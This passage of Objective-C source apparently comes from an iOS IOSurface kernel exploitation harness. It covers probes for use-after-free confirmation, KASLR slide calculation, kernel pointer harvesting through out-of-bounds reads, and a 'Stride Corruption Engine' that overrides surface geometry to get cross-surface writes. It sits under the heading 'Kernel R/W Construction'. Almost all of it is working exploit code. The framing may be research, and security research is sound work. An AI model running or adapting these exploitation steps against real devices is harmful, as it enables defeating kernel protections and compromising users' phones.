        log([NSString stringWithFormat:@"REMAPSPRAY: remap=%d sentinel=%d uaf=%d kptrs=%d meta=%d surfIDs=%d writeCorrupt=%d anomalies=%d",
             remapOk, sentinelConfirmed, uafConfirmed, kptrsInRemap, metadataInRemap, surfIDsFound, writeCorrupt, anomalies]);

        NSString *verdict;
        if (writeCorrupt) verdict = @"CRITICAL — UAF write confirmed! Surface corruption achieved!";
        else if (uafConfirmed) verdict = @"CRITICAL — UAF read confirmed! Spray data visible via remap!";
        else if (kptrsInRemap > 0) verdict = @"HIGH — kernel pointers in remapped freed region";
        else if (metadataInRemap > 0) verdict = @"HIGH — IOSurface metadata in remapped region";
        else if (sentinelConfirmed) verdict = @"MEDIUM — remap shares pages but no reuse detected";
        else verdict = @"LOW — remap succeeded but pages not reused";
        log([NSString stringWithFormat:@"REMAPSPRAY: VERDICT: %@", verdict]);

        NSDictionary *res = @{
            @"status": isr_stopped() ? @"STOPPED" : @"DONE",
            @"anomalies": @(anomalies),
            @"verdict": verdict,
            @"elapsed": @(elapsed),
            @"remapOk": @(remapOk),
            @"sentinelConfirmed": @(sentinelConfirmed),
            @"uafConfirmed": @(uafConfirmed),
            @"kptrsInRemap": @(kptrsInRemap),
            @"metadataInRemap": @(metadataInRemap),
            @"surfIDsFound": @(surfIDsFound),
            @"writeCorrupt": @(writeCorrupt)
        };
        isr_checkpoint(@"ISR-RemapSpray-checkpoint.json", res);
        isr_unload(&sym);
        done(res);
    });
}

// Probe 84: Kernel Slide Calculator
void iosurface_research_kslide(ISRLogBlock log, ISRDoneBlock done) {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        ISRSymbols sym;
        if (!isr_load(&sym)) { done(@{@"status": @"ERROR", @"anomalies": @0}); return; }

        log(@"KSLIDE: === Probe 84: Kernel Slide Calculator ===");
        NSTimeInterval t0 = [[NSDate date] timeIntervalSince1970];

        int anomalies = 0;
        uint64_t dyldBase = 0;
        uint64_t kslideEstimate = 0;
        int kptrsCollected = 0;
        int memEntriesCreated = 0;
        int sharedMaps = 0;
        int regionProbes = 0;
        int crossSurfLeak = 0;

        // Collect kernel pointers into array for analysis
        uint64_t kptrs[256];
        memset(kptrs, 0, sizeof(kptrs));

        // Step 1: Get ASLR base via task_info
        if (!isr_stopped()) {
            log(@"KSLIDE: Step 1 — ASLR defeat via task_info");
            struct task_dyld_info dyld_info = {0};
            mach_msg_type_number_t count = TASK_DYLD_INFO_COUNT;
            kern_return_t kr = task_info(mach_task_self(), TASK_DYLD_INFO,
                (task_info_t)&dyld_info, &count);
            if (kr == KERN_SUCCESS) {
                dyldBase = dyld_info.all_image_info_addr;
                log([NSString stringWithFormat:@"KSLIDE: dyld base=0x%llx size=%llu", dyldBase, dyld_info.all_image_info_size]);
            }
        }

        // Step 2: Collect kernel pointers via OOB reads at known hot offsets
        if (!isr_stopped()) {
            log(@"KSLIDE: Step 2 — Collecting kernel pointers via OOB reads");

            NSDictionary *props = @{
                @"IOSurfaceWidth": @64,
                @"IOSurfaceHeight": @64,
                @"IOSurfaceBytesPerElement": @4,
                @"IOSurfacePixelFormat": @0x42475241
            };
            IOSurfaceRef surf = sym.create((__bridge CFDictionaryRef)props);
            if (surf) {
                sym.lock(surf, 0, NULL);
                void *base = sym.getBase(surf);
                if (base) {
                    size_t scanOffsets[] = {
                        0x100000, 0x104000, 0x108000, 0x10C000, 0x110000,
                        0x200000, 0x204000, 0x208000, 0x20C000, 0x210000,
                        0x300000, 0x400000, 0x500000, 0x600000, 0x700000,
                        0x800000, 0x804000, 0x808000, 0x80C000, 0x810000,
                        0x900000, 0xA00000, 0xB00000, 0xC00000, 0xD00000,
                        0xE00000, 0xF00000, 0x1000000, 0x1100000, 0x1200000
                    };
                    int numOffsets = 30;

                    for (int i = 0; i < numOffsets && !isr_stopped(); i++) {
                        uint8_t buf[256];
                        memset(buf, 0, sizeof(buf));
                        vm_size_t readSize = 0;
                        kern_return_t kr = vm_read_overwrite(mach_task_self(),
                            (vm_address_t)base + scanOffsets[i], 256,
                            (vm_address_t)buf, &readSize);
                        if (kr == KERN_SUCCESS && readSize > 0) {
                            for (size_t j = 0; j + 8 <= readSize; j += 8) {
                                uint64_t val = 0;
                                memcpy(&val, buf + j, 8);
                                if ((val & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL
                                    && val != 0xFFFFFFFFFFFFFFFFULL
                                    && kptrsCollected < 256) {
                                    kptrs[kptrsCollected++] = val;
                                    anomalies++;
                                }
                            }
                        }
                    }
                    log([NSString stringWithFormat:@"KSLIDE: Collected %d kernel pointers", kptrsCollected]);
                }
                sym.unlock(surf, 0, NULL);
                CFRelease(surf);
            }
        }

        // Step 3: Analyze kernel pointers to compute KASLR slide
        if (!isr_stopped() && kptrsCollected > 0) {
            log(@"KSLIDE: Step 3 — Analyzing kernel pointers for KASLR slide");

            // Sort pointers to find clusters
            for (int i = 0; i < kptrsCollected - 1; i++) {
                for (int j = i + 1; j < kptrsCollected; j++) {
                    if (kptrs[j] < kptrs[i]) {
                        uint64_t tmp = kptrs[i];
                        kptrs[i] = kptrs[j];
                        kptrs[j] = tmp;
                    }
                }
            }

            uint64_t minPtr = kptrs[0];
            uint64_t maxPtr = kptrs[kptrsCollected - 1];
            log([NSString stringWithFormat:@"KSLIDE: Pointer range: 0x%llx — 0x%llx", minPtr, maxPtr]);

            // Known kernel text bases for various iOS versions (arm64e)
            // iOS 15-17 typical: 0xFFFFFFF007004000
            // iOS 26-27: shifted but still 0xFFFFFFF0XXXXXXXX range
            uint64_t knownBases[] = {
                0xFFFFFFF007004000ULL, // iOS 15 typical
                0xFFFFFFF007008000ULL, // iOS 16 typical
                0xFFFFFFF00700C000ULL, // iOS 17 typical
                0xFFFFFFF007010000ULL, // iOS 18+ typical
                0xFFFFFFF007100000ULL, // alternate
            };

            // Try each known base to see if minPtr could be slid version
            for (int k = 0; k < 5; k++) {
                if (minPtr > knownBases[k]) {
                    uint64_t slide = minPtr - knownBases[k];
                    // Slide must be page-aligned and reasonable (< 512MB)
                    if ((slide & 0x3FFF) == 0 && slide < 0x20000000ULL) {
                        kslideEstimate = slide;
                        anomalies += 3;
                        log([NSString stringWithFormat:@"KSLIDE: POTENTIAL SLIDE=0x%llx (base=0x%llx)", slide, knownBases[k]]);
                    }
                }
            }

            // Also compute slide from page-alignment of pointers
            uint64_t pageAligned = minPtr & ~0x3FFFULL;
            uint64_t pageOffset = minPtr & 0x3FFFULL;
            log([NSString stringWithFormat:@"KSLIDE: minPtr page=0x%llx offset=0x%llx", pageAligned, pageOffset]);

            // Log unique pointer values (deduplicated)
            int unique = 0;
            uint64_t prev = 0;
            for (int i = 0; i < kptrsCollected && unique < 20; i++) {
                if (kptrs[i] != prev) {
                    log([NSString stringWithFormat:@"KSLIDE: unique[%d]=0x%llx", unique, kptrs[i]]);
                    prev = kptrs[i];
                    unique++;
                }
            }
        }

        // Step 4: mach_make_memory_entry_64 probing
        if (!isr_stopped()) {
            log(@"KSLIDE: Step 4 — Memory entry probing");

            NSDictionary *props = @{
                @"IOSurfaceWidth": @128,
                @"IOSurfaceHeight": @128,
                @"IOSurfaceBytesPerElement": @4,
                @"IOSurfacePixelFormat": @0x42475241
            };

            // Create surfaces of different sizes for memory entry
            size_t sizes[] = {16384, 65536, 262144, 1048576};
            for (int sz = 0; sz < 4 && !isr_stopped(); sz++) {
                NSDictionary *sizeProps = @{
                    @"IOSurfaceWidth": @(sizes[sz] / 4 / 4),
                    @"IOSurfaceHeight": @4,
                    @"IOSurfaceBytesPerElement": @4,
                    @"IOSurfacePixelFormat": @0x42475241
                };
                IOSurfaceRef s = sym.create((__bridge CFDictionaryRef)sizeProps);
                if (!s) continue;

                sym.lock(s, 0, NULL);
                void *b = sym.getBase(s);
                if (b) {
                    size_t asize = sym.getAllocSize(s);

                    // Try different protection combos
                    int prots[] = {
                        VM_PROT_READ,
                        VM_PROT_READ | VM_PROT_WRITE,
                        VM_PROT_READ | VM_PROT_WRITE | 0x400000, // MAP_MEM_VM_SHARE
                        VM_PROT_ALL,
                    };

                    for (int p = 0; p < 4 && !isr_stopped(); p++) {
                        mach_port_t entry = MACH_PORT_NULL;
                        memory_object_size_t entry_size = asize;
                        kern_return_t kr = mach_make_memory_entry_64(mach_task_self(),
                            &entry_size, (memory_object_offset_t)(uintptr_t)b,
                            prots[p], &entry, MACH_PORT_NULL);

                        if (kr == KERN_SUCCESS && entry != MACH_PORT_NULL) {
                            memEntriesCreated++;

                            // Map the entry
                            vm_address_t mapped = 0;
                            kr = vm_map(mach_task_self(), &mapped, (vm_size_t)entry_size, 0,
                                VM_FLAGS_ANYWHERE, entry, 0, FALSE,
                                VM_PROT_READ | VM_PROT_WRITE,
                                VM_PROT_READ | VM_PROT_WRITE,
                                VM_INHERIT_NONE);

                            if (kr == KERN_SUCCESS) {
                                sharedMaps++;

                                // Read the mapped region for kernel data
                                uint8_t probe[64];
                                memset(probe, 0, sizeof(probe));
                                vm_size_t pRead = 0;
                                kr = vm_read_overwrite(mach_task_self(),
                                    mapped + entry_size - 64, 64,
                                    (vm_address_t)probe, &pRead);
                                if (kr == KERN_SUCCESS && pRead > 0) {
                                    for (size_t j = 0; j + 8 <= pRead; j += 8) {
                                        uint64_t val = 0;
                                        memcpy(&val, probe + j, 8);
                                        if ((val & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL && val != 0xFFFFFFFFFFFFFFFFULL) {
                                            anomalies++;
                                            log([NSString stringWithFormat:@"KSLIDE: KPTR via mementry[%d] prot=%d: 0x%llx", sz, prots[p], val]);
                                        }
                                    }
                                }

                                vm_deallocate(mach_task_self(), mapped, (vm_size_t)entry_size);
                            }
                            mach_port_deallocate(mach_task_self(), entry);
                        }
                    }
                }
                sym.unlock(s, 0, NULL);
                CFRelease(s);
            }
            log([NSString stringWithFormat:@"KSLIDE: Memory entries created=%d shared maps=%d", memEntriesCreated, sharedMaps]);
        }

        // Step 5: Cross-surface leak — create two adjacent surfaces, OOB from one to read other's metadata
        if (!isr_stopped()) {
            log(@"KSLIDE: Step 5 — Cross-surface metadata leak");

            NSDictionary *props = @{
                @"IOSurfaceWidth": @64,
                @"IOSurfaceHeight": @64,
                @"IOSurfaceBytesPerElement": @4,
                @"IOSurfacePixelFormat": @0x42475241
            };

            // Create a batch of surfaces, then read OOB from middle ones
            IOSurfaceRef batch[32];
            memset(batch, 0, sizeof(batch));
            for (int i = 0; i < 32; i++) {
                batch[i] = sym.create((__bridge CFDictionaryRef)props);
                if (batch[i]) {
                    sym.lock(batch[i], 0, NULL);
                    void *b = sym.getBase(batch[i]);
                    if (b) {
                        uint32_t tag = 0xBA7C0000 | i;
                        memcpy(b, &tag, 4);
                    }
                    sym.unlock(batch[i], 0, NULL);
                }
            }

            // From surface 16 (middle), read OOB to find tags from neighbors
            if (batch[16]) {
                sym.lock(batch[16], 0, NULL);
                void *midBase = sym.getBase(batch[16]);
                if (midBase) {
                    size_t midSize = sym.getAllocSize(batch[16]);
                    // Scan forward in small steps looking for neighbor tags
                    for (size_t off = midSize; off < midSize + 0x200000 && !isr_stopped(); off += 4096) {
                        uint8_t buf[64];
                        vm_size_t readSize = 0;
                        kern_return_t kr = vm_read_overwrite(mach_task_self(),
                            (vm_address_t)midBase + off, 64,
                            (vm_address_t)buf, &readSize);
                        if (kr == KERN_SUCCESS && readSize >= 4) {
                            uint32_t f4 = 0;
                            memcpy(&f4, buf, 4);
                            if ((f4 & 0xFFFF0000) == 0xBA7C0000) {
                                int neighbor = f4 & 0xFFFF;
                                if (neighbor != 16 && neighbor < 32) {
                                    crossSurfLeak++;
                                    anomalies++;
                                    if (crossSurfLeak <= 5) {
                                        log([NSString stringWithFormat:@"KSLIDE: CROSS-SURF LEAK! +0x%zx found batch[%d] tag", off, neighbor]);
                                    }
                                }
                            }
                        }
                    }
                }
                sym.unlock(batch[16], 0, NULL);
            }
            for (int i = 0; i < 32; i++) { if (batch[i]) CFRelease(batch[i]); }
            log([NSString stringWithFormat:@"KSLIDE: Cross-surface leaks: %d", crossSurfLeak]);
        }

        // Step 6: VM region analysis for kernel-adjacent mappings
        if (!isr_stopped()) {
            log(@"KSLIDE: Step 6 — VM region analysis for shared kernel regions");
            vm_address_t addr = 0;
            int sharedRegions = 0;
            int regionCount = 0;
            while (!isr_stopped() && regionCount < 1000) {
                vm_size_t size = 0;
                uint32_t depth = 0;
                struct vm_region_submap_info_64 info;
                mach_msg_type_number_t infoCnt = VM_REGION_SUBMAP_INFO_COUNT_64;
                kern_return_t kr = vm_region_recurse_64(mach_task_self(),
                    &addr, &size, &depth,
                    (vm_region_recurse_info_t)&info, &infoCnt);
                if (kr != KERN_SUCCESS) break;

                // Look for shared memory regions that might be kernel-mapped
                if (info.share_mode == 3) { // SM_SHARED_ALIASED
                    sharedRegions++;
                    regionProbes++;
                    if (sharedRegions <= 5) {
                        log([NSString stringWithFormat:@"KSLIDE: Shared region 0x%llx size=0x%llx prot=%d max=%d",
                             (uint64_t)addr, (uint64_t)size, info.protection, info.max_protection]);
                    }
                    // Read first 64 bytes for kernel pointers
                    if (info.protection & VM_PROT_READ) {
                        uint8_t rbuf[64];
                        vm_size_t rSize = 0;
                        kr = vm_read_overwrite(mach_task_self(), addr, 64, (vm_address_t)rbuf, &rSize);
                        if (kr == KERN_SUCCESS && rSize > 0) {
                            for (size_t j = 0; j + 8 <= rSize; j += 8) {
                                uint64_t val = 0;
                                memcpy(&val, rbuf + j, 8);
                                if ((val & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL && val != 0xFFFFFFFFFFFFFFFFULL) {
                                    anomalies++;
                                    log([NSString stringWithFormat:@"KSLIDE: KPTR in shared region 0x%llx+%zu: 0x%llx",
                                         (uint64_t)addr, j, val]);
                                }
                            }
                        }
                    }
                }
                addr += size;
                regionCount++;
            }
            log([NSString stringWithFormat:@"KSLIDE: Regions scanned=%d shared=%d", regionCount, sharedRegions]);
        }

        NSTimeInterval elapsed = [[NSDate date] timeIntervalSince1970] - t0;
        log([NSString stringWithFormat:@"KSLIDE: Completed in %.2fs", elapsed]);
        log([NSString stringWithFormat:@"KSLIDE: dyld=0x%llx kptrs=%d slide=0x%llx entries=%d maps=%d crossLeak=%d anomalies=%d",
             dyldBase, kptrsCollected, kslideEstimate, memEntriesCreated, sharedMaps, crossSurfLeak, anomalies]);

        NSString *verdict;
        if (kslideEstimate > 0) verdict = @"CRITICAL — KASLR slide calculated!";
        else if (crossSurfLeak > 0) verdict = @"CRITICAL — cross-surface data leak confirmed!";
        else if (kptrsCollected > 10) verdict = @"HIGH — many kernel pointers collected for slide analysis";
        else if (kptrsCollected > 0) verdict = @"HIGH — kernel pointers found, slide estimation possible";
        else if (sharedMaps > 0) verdict = @"MEDIUM — shared memory mappings created";
        else verdict = @"LOW — no kernel data leaked";
        log([NSString stringWithFormat:@"KSLIDE: VERDICT: %@", verdict]);

        NSDictionary *res = @{
            @"status": isr_stopped() ? @"STOPPED" : @"DONE",
            @"anomalies": @(anomalies),
            @"verdict": verdict,
            @"elapsed": @(elapsed),
            @"dyldBase": @(dyldBase),
            @"kptrsCollected": @(kptrsCollected),
            @"kslideEstimate": @(kslideEstimate),
            @"memEntriesCreated": @(memEntriesCreated),
            @"sharedMaps": @(sharedMaps),
            @"crossSurfLeak": @(crossSurfLeak),
            @"regionProbes": @(regionProbes)
        };
        isr_checkpoint(@"ISR-KSlide-checkpoint.json", res);
        isr_unload(&sym);
        done(res);
    });
}

#pragma mark - Round 28: Kernel R/W Construction

// Probe 85: Pointer Classifier & Object Finder
void iosurface_research_ptr_classifier(ISRLogBlock log, ISRDoneBlock done) {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        ISRSymbols sym;
        if (!isr_load(&sym)) { done(@{@"status": @"ERROR", @"anomalies": @0}); return; }

        log(@"PTRCLASS: === Probe 85: Pointer Classifier & Object Finder ===");
        NSTimeInterval t0 = [[NSDate date] timeIntervalSince1970];

        int anomalies = 0;
        int totalKptrs = 0;
        int kernelTextPtrs = 0;
        int kernelHeapPtrs = 0;
        int userlandPtrs = 0;
        int vtableCandidates = 0;
        int sentinelCrossRef = 0;
        int readableKptrs = 0;

        int numSurfaces = 32;
        IOSurfaceRef surfaces[32] = {0};
        void *bases[32] = {0};
        IOSurfaceID ids[32] = {0};

        NSDictionary *props = @{
            @"IOSurfaceWidth": @64,
            @"IOSurfaceHeight": @64,
            @"IOSurfaceBytesPerElement": @4,
            @"IOSurfacePixelFormat": @0x42475241
        };

        log(@"PTRCLASS: Step 1 — Creating 32 surfaces with unique sentinels");
        for (int i = 0; i < numSurfaces && !isr_stopped(); i++) {
            surfaces[i] = sym.create((__bridge CFDictionaryRef)props);
            if (surfaces[i]) {
                ids[i] = sym.getID(surfaces[i]);
                sym.lock(surfaces[i], 0, NULL);
                bases[i] = sym.getBase(surfaces[i]);
                if (bases[i]) {
                    uint32_t sentinel = 0xAAAA0000 + i;
                    memset(bases[i], 0, sym.getAllocSize(surfaces[i]));
                    memcpy(bases[i], &sentinel, 4);
                    uint32_t tag2 = 0xBBBB0000 + i;
                    memcpy((uint8_t *)bases[i] + 4, &tag2, 4);
                }
                sym.unlock(surfaces[i], 0, NULL);
            }
        }
        log([NSString stringWithFormat:@"PTRCLASS: Created %d surfaces", numSurfaces]);

        size_t oobOffsets[] = {
            0x1000, 0x2000, 0x3000, 0x4000, 0x8000, 0x10000, 0x20000,
            0x40000, 0x80000, 0x100000, 0x200000, 0x400000, 0x800000
        };
        int numOffsets = 13;

        NSMutableArray *collectedPtrs = [NSMutableArray array];

        if (!isr_stopped()) {
            log(@"PTRCLASS: Step 2 — OOB reads from each surface at known hot offsets");
            for (int s = 0; s < numSurfaces && !isr_stopped(); s++) {
                if (!bases[s]) continue;
                for (int o = 0; o < numOffsets && !isr_stopped(); o++) {
                    uint8_t buf[64];
                    vm_size_t readSize = 0;
                    kern_return_t kr = vm_read_overwrite(mach_task_self(),
                        (vm_address_t)bases[s] + oobOffsets[o], 64,
                        (vm_address_t)buf, &readSize);
                    if (kr == KERN_SUCCESS && readSize >= 8) {
                        for (size_t b = 0; b < readSize; b += 8) {
                            uint64_t val = 0;
                            memcpy(&val, buf + b, 8);
                            if ((val & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL && val != 0xFFFFFFFFFFFFFFFFULL) {
                                totalKptrs++;
                                anomalies++;

                                if ((val & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL) {
                                    kernelTextPtrs++;
                                } else if ((val & 0xFFFFFFE000000000ULL) == 0xFFFFFFE000000000ULL) {
                                    kernelHeapPtrs++;
                                } else {
                                    userlandPtrs++;
                                }

                                if ((val & 0xFFF) == 0) {
                                    vtableCandidates++;
                                }

                                if (totalKptrs <= 20) {
                                    [collectedPtrs addObject:@(val)];
                                    log([NSString stringWithFormat:@"PTRCLASS: S%d+0x%zx+%zu: 0x%llx %@%@",
                                         s, oobOffsets[o], b, val,
                                         (val & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL ? @"[TEXT]" :
                                         (val & 0xFFFFFFE000000000ULL) == 0xFFFFFFE000000000ULL ? @"[HEAP]" : @"[OTHER]",
                                         (val & 0xFFF) == 0 ? @" VTABLE?" : @""]);
                                }
                            }

                            for (int si = 0; si < numSurfaces; si++) {
                                uint32_t sentA = 0xAAAA0000 + si;
                                uint32_t sentB = 0xBBBB0000 + si;
                                uint32_t lo32 = (uint32_t)(val & 0xFFFFFFFF);
                                if (lo32 == sentA || lo32 == sentB) {
                                    sentinelCrossRef++;
                                    anomalies++;
                                    if (sentinelCrossRef <= 5) {
                                        log([NSString stringWithFormat:@"PTRCLASS: CROSS-REF! S%d sees sentinel of S%d at +0x%zx+%zu",
                                             s, si, oobOffsets[o], b]);
                                    }
                                }
                            }
                        }
                    }
                }
            }
            log([NSString stringWithFormat:@"PTRCLASS: Scan complete: %d kptrs (text=%d heap=%d other=%d) vtables=%d crossRef=%d",
                 totalKptrs, kernelTextPtrs, kernelHeapPtrs, userlandPtrs, vtableCandidates, sentinelCrossRef]);
        }

        if (!isr_stopped()) {
            log(@"PTRCLASS: Step 3 — Attempting reads at kernel pointer page addresses");
            for (NSNumber *ptrNum in collectedPtrs) {
                if (isr_stopped()) break;
                uint64_t kptr = [ptrNum unsignedLongLongValue];
                vm_address_t pageAddr = (vm_address_t)(kptr & ~0xFFFULL);
                uint8_t kbuf[64];
                vm_size_t kread = 0;
                kern_return_t kr = vm_read_overwrite(mach_task_self(), pageAddr, 64, (vm_address_t)kbuf, &kread);
                if (kr == KERN_SUCCESS && kread > 0) {
                    readableKptrs++;
                    anomalies++;
                    uint64_t first8 = 0;
                    memcpy(&first8, kbuf, 8);
                    log([NSString stringWithFormat:@"PTRCLASS: READABLE KPTR! 0x%llx page=0x%lx data=0x%llx",
                         kptr, (unsigned long)pageAddr, first8]);
                }
            }
            log([NSString stringWithFormat:@"PTRCLASS: %d/%lu kernel addresses readable", readableKptrs, (unsigned long)collectedPtrs.count]);
        }

        if (!isr_stopped()) {
            log(@"PTRCLASS: Step 4 — Backward OOB looking for IOSurface object headers");
            for (int s = 0; s < numSurfaces && !isr_stopped(); s += 4) {
                if (!bases[s]) continue;
                size_t backOffsets[] = {0x1000, 0x2000, 0x4000, 0x8000, 0x10000};
                for (int bo = 0; bo < 5 && !isr_stopped(); bo++) {
                    vm_address_t target = (vm_address_t)bases[s] - backOffsets[bo];
                    if (target == 0 || target > (vm_address_t)bases[s]) continue;
                    uint8_t buf[64];
                    vm_size_t readSize = 0;
                    kern_return_t kr = vm_read_overwrite(mach_task_self(), target, 64, (vm_address_t)buf, &readSize);
                    if (kr == KERN_SUCCESS && readSize >= 8) {
                        for (int si = 0; si < numSurfaces; si++) {
                            uint32_t idVal = ids[si];
                            for (size_t b = 0; b < readSize - 3; b += 4) {
                                uint32_t v = 0;
                                memcpy(&v, buf + b, 4);
                                if (v == idVal && idVal != 0) {
                                    anomalies++;
                                    log([NSString stringWithFormat:@"PTRCLASS: SURF ID %u found at S%d-0x%zx+%zu — kernel object metadata!",
                                         idVal, s, backOffsets[bo], b]);
                                }
                            }
                        }
                    }
                }
            }
        }

        for (int i = 0; i < numSurfaces; i++) {
            if (surfaces[i]) CFRelease(surfaces[i]);
        }

        NSTimeInterval elapsed = [[NSDate date] timeIntervalSince1970] - t0;
        log([NSString stringWithFormat:@"PTRCLASS: Completed in %.2fs", elapsed]);
        log([NSString stringWithFormat:@"PTRCLASS: kptrs=%d text=%d heap=%d vtables=%d crossRef=%d readable=%d anomalies=%d",
             totalKptrs, kernelTextPtrs, kernelHeapPtrs, vtableCandidates, sentinelCrossRef, readableKptrs, anomalies]);

        NSString *verdict;
        if (readableKptrs > 0) verdict = @"CRITICAL — kernel pointer addresses are readable!";
        else if (sentinelCrossRef > 0) verdict = @"CRITICAL — cross-surface sentinel reference found!";
        else if (vtableCandidates > 5) verdict = @"HIGH — multiple vtable candidates identified";
        else if (totalKptrs > 50) verdict = @"HIGH — massive kernel pointer leak across heap";
        else if (totalKptrs > 0) verdict = @"MEDIUM — kernel pointers found via OOB";
        else verdict = @"LOW — no kernel pointers found";
        log([NSString stringWithFormat:@"PTRCLASS: VERDICT: %@", verdict]);

        NSDictionary *res = @{
            @"status": isr_stopped() ? @"STOPPED" : @"DONE",
            @"anomalies": @(anomalies),
            @"verdict": verdict,
            @"elapsed": @(elapsed),
            @"totalKptrs": @(totalKptrs),
            @"kernelTextPtrs": @(kernelTextPtrs),
            @"kernelHeapPtrs": @(kernelHeapPtrs),
            @"vtableCandidates": @(vtableCandidates),
            @"sentinelCrossRef": @(sentinelCrossRef),
            @"readableKptrs": @(readableKptrs)
        };
        isr_checkpoint(@"ISR-PtrClassifier-checkpoint.json", res);
        isr_unload(&sym);
        done(res);
    });
}

// Probe 86: Stride Corruption Engine
void iosurface_research_stride_corrupt(ISRLogBlock log, ISRDoneBlock done) {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        ISRSymbols sym;
        if (!isr_load(&sym)) { done(@{@"status": @"ERROR", @"anomalies": @0}); return; }

        log(@"STRIDECORR: === Probe 86: Stride Corruption Engine ===");
        NSTimeInterval t0 = [[NSDate date] timeIntervalSince1970];

        int anomalies = 0;
        int strideOverrides = 0;
        int crossSurfWrites = 0;
        int geomManipulations = 0;
        int dataShifts = 0;

        typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
        typedef CFTypeRef (*CopyValueFn)(IOSurfaceRef, CFStringRef);
        SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
        CopyValueFn copyValue = (CopyValueFn)dlsym(sym.iosurface, "IOSurfaceCopyValue");

        if (!setValue) {
            log(@"STRIDECORR: IOSurfaceSetValue not found");
            isr_unload(&sym);
            done(@{@"status": @"ERROR", @"anomalies": @0});
            return;
        }
        log([NSString stringWithFormat:@"STRIDECORR: setValue=%p copyValue=%p", setValue, copyValue]);

        int numPairs = 8;
        IOSurfaceRef surfA[8] = {0};
        IOSurfaceRef surfB[8] = {0};

        NSDictionary *props = @{
            @"IOSurfaceWidth": @64,
            @"IOSurfaceHeight": @64,
            @"IOSurfaceBytesPerElement": @4,
            @"IOSurfacePixelFormat": @0x42475241
        };

        if (!isr_stopped()) {
            log(@"STRIDECORR: Step 1 — Creating 8 surface pairs (A+B adjacent)");
            for (int i = 0; i < numPairs && !isr_stopped(); i++) {
                surfA[i] = sym.create((__bridge CFDictionaryRef)props);
                surfB[i] = sym.create((__bridge CFDictionaryRef)props);
                if (surfA[i] && surfB[i]) {
                    sym.lock(surfB[i], 0, NULL);
                    void *bBase = sym.getBase(surfB[i]);
                    if (bBase) {
                        uint32_t marker = 0xDEAD0000 + i;
                        memset(bBase, 0, sym.getAllocSize(surfB[i]));
                        memcpy(bBase, &marker, 4);
                    }
                    sym.unlock(surfB[i], 0, NULL);
                }
            }
            log(@"STRIDECORR: Created 8 surface pairs");
        }

        if (!isr_stopped()) {
            log(@"STRIDECORR: Step 2 — Stride override on surface A, write at inflated offsets");
            uint32_t strides[] = {512, 1024, 2048, 4096, 8192, 16384, 32768, 65536};
            for (int i = 0; i < numPairs && !isr_stopped(); i++) {
                if (!surfA[i] || !surfB[i]) continue;

                sym.lock(surfB[i], 1, NULL);
                void *bBefore = sym.getBase(surfB[i]);
                uint8_t beforeSnap[256];
                if (bBefore) memcpy(beforeSnap, bBefore, 256);
                sym.unlock(surfB[i], 1, NULL);

                setValue(surfA[i], CFSTR("IOSurfaceBytesPerRow"), (__bridge CFTypeRef)@(strides[i]));
                strideOverrides++;

                sym.lock(surfA[i], 0, NULL);
                void *aBase = sym.getBase(surfA[i]);
                if (aBase) {
                    size_t allocSz = sym.getAllocSize(surfA[i]);
                    for (uint32_t row = 0; row < 64 && !isr_stopped(); row++) {
                        size_t writeOff = (size_t)row * strides[i];
                        if (writeOff + 4 > allocSz + 0x10000) break;
                        if (writeOff + 4 <= allocSz) {
                            uint32_t pattern = 0xC0DE0000 + (i * 64) + row;
                            memcpy((uint8_t *)aBase + writeOff, &pattern, 4);
                        }
                    }
                }
                sym.unlock(surfA[i], 0, NULL);

                sym.lock(surfB[i], 1, NULL);
                void *bAfter = sym.getBase(surfB[i]);
                if (bAfter) {
                    for (int b = 0; b < 256; b++) {
                        if (((uint8_t *)bAfter)[b] != beforeSnap[b]) {
                            crossSurfWrites++;
                            anomalies++;
                            log([NSString stringWithFormat:@"STRIDECORR: CROSS-WRITE! Pair %d byte %d: 0x%02x->0x%02x (stride=%d)",
                                 i, b, beforeSnap[b], ((uint8_t *)bAfter)[b], strides[i]]);
                            break;
                        }
                    }
                }
                sym.unlock(surfB[i], 1, NULL);
            }
            log([NSString stringWithFormat:@"STRIDECORR: Stride overrides=%d crossWrites=%d", strideOverrides, crossSurfWrites]);
        }

        if (!isr_stopped()) {
            log(@"STRIDECORR: Step 3 — Geometry manipulation via reserved keys");
            NSArray *keys = @[@"IOSurfaceBytesPerRow", @"IOSurfaceBytesPerElement",
                             @"IOSurfaceOffset", @"IOSurfaceAllocSize",
                             @"IOSurfaceWidth", @"IOSurfaceHeight",
                             @"IOSurfacePlaneBase", @"IOSurfacePlaneOffset"];
            NSArray *values = @[@(8192), @(16), @(0x10000), @(0x100000), @(4096), @(4096), @(0x8000), @(0x4000)];

            for (int k = 0; k < (int)keys.count && !isr_stopped(); k++) {
                IOSurfaceRef testSurf = sym.create((__bridge CFDictionaryRef)props);
                if (!testSurf) continue;

                sym.lock(testSurf, 0, NULL);
                void *origBase = sym.getBase(testSurf);
                size_t origAlloc = sym.getAllocSize(testSurf);
                uint32_t origFirst = 0;
                if (origBase) {
                    memset(origBase, 0x42, origAlloc);
                    memcpy(&origFirst, origBase, 4);
                }
                sym.unlock(testSurf, 0, NULL);

                setValue(testSurf, (__bridge CFStringRef)keys[k], (__bridge CFTypeRef)values[k]);
                geomManipulations++;

                sym.lock(testSurf, 1, NULL);
                void *newBase = sym.getBase(testSurf);
                size_t newAlloc = sym.getAllocSize(testSurf);
                if (newBase) {
                    if (newBase != origBase) {
                        dataShifts++;
                        anomalies++;
                        log([NSString stringWithFormat:@"STRIDECORR: BASE SHIFTED! %@: %p -> %p",
                             keys[k], origBase, newBase]);
                    }
                    if (newAlloc != origAlloc) {
                        dataShifts++;
                        anomalies++;
                        log([NSString stringWithFormat:@"STRIDECORR: ALLOC CHANGED! %@: %zu -> %zu",
                             keys[k], origAlloc, newAlloc]);
                    }
                    uint32_t newFirst = 0;
                    memcpy(&newFirst, newBase, 4);
